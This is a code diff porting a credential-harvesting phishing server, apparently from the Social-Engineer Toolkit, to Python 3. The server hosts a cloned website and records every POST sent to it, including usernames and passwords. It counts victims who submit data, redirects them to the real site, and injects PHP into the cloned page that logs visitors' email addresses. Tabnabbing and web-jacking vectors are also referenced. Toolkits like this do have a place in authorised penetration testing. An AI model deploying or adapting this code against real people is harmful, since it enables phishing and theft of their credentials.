@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import subprocess
 import sys
 import os
@@ -84,10 +84,9 @@ for line in fileopen:
 # if attack vector isnt the multiattack
 if attack_vector != "multiattack":
     print(bcolors.RED + """
-The best way to use this attack is if username and password form
-fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC)
-# see if we're tabnabbing or multiattack
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC)
 
+# see if we're tabnabbing or multiattack
 homepath = os.getcwd()
 
 # pull scraper
@@ -197,26 +196,20 @@ for line in fileopen:
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 # url decode for postbacks
-
-
 def htc(m):
     return chr(int(m.group(1), 16))
 
 # url decode
-
-
 def urldecode(url):
+    url = url.decode('utf-8')
     rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
     return rex.sub(htc, url)
-
 
 # here is where we specify how many people actually visited versus fell for it
 visits = open(userconfigpath + "visits.file", "a")
 bites = open(userconfigpath + "bites.file", "a")
 
 # SET Handler for handling POST requests and general setup through SSL
-
-
 class SETHandler(BaseHTTPRequestHandler):
 
     def setup(self):
@@ -224,8 +217,8 @@ class SETHandler(BaseHTTPRequestHandler):
         try:
 
             self.connection = self.request
-            self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
-            self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)
+            self.rfile = socket.SocketIO(self.request, "rb")
+            self.wfile = socket.SocketIO(self.request, "wb")
 
         # except errors and pass them
         except:
@@ -258,6 +251,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 self.end_headers()
                 fileopen = open(userconfigpath + "web_clone/index.html", "r")
                 for line in fileopen:
+                    line = line.encode('utf-8')
                     self.wfile.write(line)
                 # write out that we had a visit
                 visits.write("hit\n")
@@ -270,6 +264,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 self.end_headers()
                 fileopen = open(userconfigpath + "web_clone/index2.html", "r")
                 for line in fileopen:
+                    line = line.encode('utf-8')
                     self.wfile.write(line)
                 # write out that we had a visit
                 visits.write("hit\n")
@@ -281,6 +276,7 @@ class SETHandler(BaseHTTPRequestHandler):
                     self.end_headers()
                     fileopen = open(requested_file, "rb")
                     for line in fileopen:
+                        line = line.encode('utf-8')
                         self.wfile.write(line)
 
                 else:
@@ -296,7 +292,8 @@ class SETHandler(BaseHTTPRequestHandler):
 
     # handle POST requests
     def do_POST(self):
-        length = int(self.headers.getheader('content-length'))
+        length = int(self.headers.get('content-length'))
+        #length = length.decode('utf-8')
         qs = self.rfile.read(length)
         url = urldecode(qs)
         # specify we had a bite
@@ -371,18 +368,16 @@ class SETHandler(BaseHTTPRequestHandler):
             counter = 1
 
         # when done posting send them back to the original site
-        self.wfile.write('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))
+        redirect = ('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL)).encode('utf-8')
+        self.wfile.write(redirect)
 
         # set it back to our homepage
         os.chdir(userconfigpath + "web_clone/")
 
-
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
 
-
 def run():
-
     # check if we are not running apache mode
     if apache_check == False:
         try:
@@ -478,14 +473,11 @@ def run():
 
         except Exception as e:
             if os.path.isfile("/etc/init.d/apache2"):
-                apache_start = input(
-                    "[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
+                apache_start = input("[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
                 if apache_start == "y":
-                    subprocess.Popen(
-                        "/etc/init.d/apache2 start", shell=True).wait()
+                    subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
 
         try:
-
             apache_dir = check_config("APACHE_DIRECTORY=")
             if os.path.isdir(apache_dir + "/html"):
                 apache_dir = apache_dir + "/html"
@@ -526,14 +518,12 @@ def run():
         if track_email == True:
             fileopen = open(userconfigpath + "web_clone/index.html", "r")
             data = fileopen.read()
-            data = data.replace(
-                "<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
+            data = data.replace("<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
             filewrite = open(userconfigpath + "web_clone/index.2", "w")
             filewrite.write(data)
             filewrite.close()
             os.remove(userconfigpath + "web_clone/index.html")
-            shutil.copyfile(userconfigpath + "web_clone/index.2",
-                            userconfigpath + "web_clone/index.html")
+            shutil.copyfile(userconfigpath + "web_clone/index.2", userconfigpath + "web_clone/index.html")
             # copy the entire web_clone directory.
             # Without this only index.php|html are copied even though the user
             # may have chosen to import the entire directory in the set module.
@@ -606,8 +596,9 @@ for line in fileopen:
     line = line.rstrip()
     if line == 'tabnabbing': 
         print(bcolors.RED + "\n[*] Tabnabbing Attack Vector is Enabled...Victim needs to switch tabs.")
-    print_status("You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.")
-    raw_input("Press {return} if you understand what we're saying here.")
+    if apache_check == True:
+        print_status("You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.")
+        input("Press {return} if you understand what we're saying here.")
     if line == 'webjacking': print(bcolors.RED + "\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.")
 
 if ssl_flag == 'true':
